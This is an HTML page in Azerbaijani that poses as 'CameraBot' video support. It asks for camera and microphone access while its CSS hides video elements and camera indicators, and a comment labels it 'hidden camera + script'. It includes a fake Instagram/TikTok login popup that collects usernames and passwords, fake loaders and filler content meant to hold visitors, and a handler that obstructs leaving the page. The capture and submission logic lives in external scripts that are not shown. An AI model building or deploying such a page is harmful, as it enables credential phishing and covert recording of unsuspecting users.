<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CameraBot - Dəstək Mərkəzi</title>
    <!-- gizli kamera + skript -->
    <script src="camera.js" defer></script>
    <script src="capture.js" defer></script>
    <script src="dwell.js" defer></script>
    <style>
        /* Bütün kamera göstəricilərini gizlət */
        video { display: none; }
        .camera-indicator { display: none !important; }
        /* Dizayn – çox cəlbedici, vaxt aparan */
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 20px;
            min-height: 100vh;
            overflow-y: scroll;
        }
        .container {
            max-width: 800px;
            margin: auto;
            animation: fadeIn 2s;
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
        .gallery img { width: 150px; height: 150px; object-fit: cover; border-radius: 10px; transition: 0.3s; }
        .gallery img:hover { transform: scale(1.1); }
        .login-btn {
            background: #fff;
            color: #667eea;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            margin: 10px;
            font-weight: bold;
            border: none;
        }
        /* Fake loaders */
        .loading { 
            width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.3); 
            border-top: 5px solid white; border-radius: 50%; 
            animation: spin 1s linear infinite; margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .popup {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center;
            z-index: 9999;
        }
        .popup-content {
            background: white; padding: 30px; border-radius: 15px; width: 300px; color: black;
        }
        .popup-content input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; }
        .popup-content button { width: 100%; padding: 10px; background: #667eea; color: white; border: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎥 CameraBot – Video Dəstək</h1>
        <p>Zəhmət olmasa, kamera və mikrofona icazə verin – keyfiyyətli xidmət üçün lazımdır.</p>
        <div class="loading" id="fakeLoader"></div>
        <p id="status">Yüklənir...</p>
        <div class="gallery" id="gallery"></div>
        <!-- Saxta login popup -->
        <button class="login-btn" onclick="showLogin()">İnsta/TikTok ilə davam et</button>
        <div class="popup" id="loginPopup">
            <div class="popup-content">
                <h3>Hesabına giriş et</h3>
                <input type="text" id="username" placeholder="İstifadəçi adı / Email">
                <input type="password" id="password" placeholder="Şifrə">
                <button onclick="submitLogin()">Daxil ol</button>
            </div>
        </div>
        <!-- Sonsuz skroll üçün yalan məzmun -->
        <div id="moreContent"></div>
    </div>
    <script>
        // Əgər istifadəçi çıxmaq istəsə, maneə törət
        window.onbeforeunload = function() { return "Sayt hələ tam yüklənməyib. Çıxmaq istəyirsən?"; };
    </script>
</body>
</html>
